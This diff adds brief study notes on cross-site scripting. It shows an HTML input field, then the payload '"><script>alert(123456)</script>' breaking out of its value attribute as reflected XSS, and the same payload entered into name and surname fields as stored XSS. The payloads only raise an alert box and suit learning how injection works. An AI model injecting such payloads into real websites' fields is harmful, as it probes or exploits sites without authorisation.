@@ -1,0 +1,38 @@
+Cross site scripting
+
+
+<html>
+<body>
+<input type=text value="">
+</body>
+</html>
+
+
+
+<html>
+<body>
+<input type=text value="numan">
+</body>
+</html>
+
+
+reflected cross site scripting
+<html>
+<body>
+<input type=text value=""><script>alert(123456)</script>">
+</body>
+</html>
+
+
+
+"><script>alert(123456)</script>
+
+stored XSS
+
+name "><script>alert(123456)</script>
+surname "><script>alert(123456)</script>
+email
+password
+
+
+hello "><script>alert(123456)</script>
